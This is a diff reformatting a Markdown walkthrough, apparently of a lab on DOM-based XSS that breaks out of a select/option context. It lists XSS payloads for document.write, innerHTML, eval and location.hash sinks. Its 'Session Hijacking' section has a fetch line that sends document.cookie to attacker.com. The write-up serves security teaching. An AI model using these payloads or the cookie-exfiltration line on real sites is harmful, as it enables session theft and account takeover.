@@ -1426,9 +1426,9 @@ XSS123
 Now inspect the live DOM using DevTools (not View Source).
 
 You find:
-
-'<option selected>XSS123</option>'
-
+```
+<option selected>XSS123</option>
+```
 This confirms that user input is inserted into the DOM.
 
 ---
@@ -1436,9 +1436,9 @@ This confirms that user input is inserted into the DOM.
 ### Step 6 — Identify context
 
 The input is placed inside:
-
-'<option selected>INPUT</option>'
-
+```
+<option selected>INPUT</option>
+```
 Which means:
 
 - It is inside an option element  
@@ -1453,9 +1453,9 @@ The select element is a restricted HTML context.
 - Scripts and many tags will not execute inside it  
 
 This means a normal payload like:
-
-'<script>alert(1)</script>'
-
+```
+<script>alert(1)</script>
+```
 will fail.
 
 ---
@@ -1465,26 +1465,28 @@ will fail.
 To exploit this, you must break out of the select structure and inject a new HTML element.
 
 Payload (encoded in lab):
-
-'"></select><img%20src=1%20onerror=alert(1)>'
-
+```
+"></select><img%20src=1%20onerror=alert(1)>
+```
 Decoded payload:
-
-'"></select><img src=1 onerror=alert(1)>'
+```
+"></select><img src=1 onerror=alert(1)>
+```
 
 ---
 
 ### Step 8 — Understand DOM transformation
 
 Before injection:
-
-'<option selected>London</option>'
-
+```
+<option selected>London</option>
+```
 After injection:
-
-'<option selected>"></option>'  
-'</select>'  
-'<img src=1 onerror=alert(1)>'
+```
+<option selected>"></option>
+</select>
+<img src=1 onerror=alert(1)>
+```
 
 ---
 
@@ -1516,13 +1518,13 @@ JavaScript executes successfully.
 Applications dynamically generate dropdown options using JavaScript.
 
 Example:
-
-'document.write("<option>"+userInput+"</option>")'
-
+```
+document.write("<option>"+userInput+"</option>")
+```
 Payload:
-
-'"></select><svg onload=alert(1)>'
-
+```
+"></select><svg onload=alert(1)>
+```
 Impact:
 
 Breaking out of restricted tags allows execution.
@@ -1532,13 +1534,13 @@ Breaking out of restricted tags allows execution.
 ### 🟢 2️⃣ document.write in Legacy Applications
 
 Older applications often use:
-
-'document.write(userInput)'
-
+```
+document.write(userInput)
+```
 Payload:
-
-'<script>alert(1)</script>'
-
+```
+<script>alert(1)</script>
+```
 Impact:
 
 Direct execution due to lack of sanitization.
@@ -1548,13 +1550,13 @@ Direct execution due to lack of sanitization.
 ### 🟢 3️⃣ innerHTML-Based DOM Injection
 
 Example:
-
-'element.innerHTML = userInput'
-
+```
+element.innerHTML = userInput
+```
 Payload:
-
-'<img src=x onerror=alert(1)>'
-
+```
+<img src=x onerror=alert(1)>
+```
 Common in:
 
 - Search results  
@@ -1566,13 +1568,13 @@ Common in:
 ### 🟢 4️⃣ JavaScript Execution Sinks
 
 Example:
-
-'eval(userInput)'
-
+```
+eval(userInput)
+```
 Payload:
-
-'alert(1)'
-
+```
+alert(1)
+```
 Also vulnerable:
 
 - setTimeout(userInput)  
@@ -1587,9 +1589,9 @@ Source:
 location.hash  
 
 Payload:
-
-'#<img src=x onerror=alert(1)>'
-
+```
+#<img src=x onerror=alert(1)>
+```
 Common in:
 
 - Single-page applications  
@@ -1602,8 +1604,9 @@ Common in:
 Applications may not expose parameters in UI but still process them via JavaScript.
 
 Attackers can manually inject:
-
-'?param=payload'
+```
+?param=payload
+```
 
 ---
 
@@ -1621,14 +1624,14 @@ Attackers can manually inject:
 
 ---
 
-## 🔗 Attack Chains
+## Attack Chains
 
 ---
 
 ### 🔥 Session Hijacking
-
-'fetch("https://attacker.com?c="+document.cookie)'
-
+```
+fetch("https://attacker.com?c="+document.cookie)
+```
 Steals session data.
 
 ---
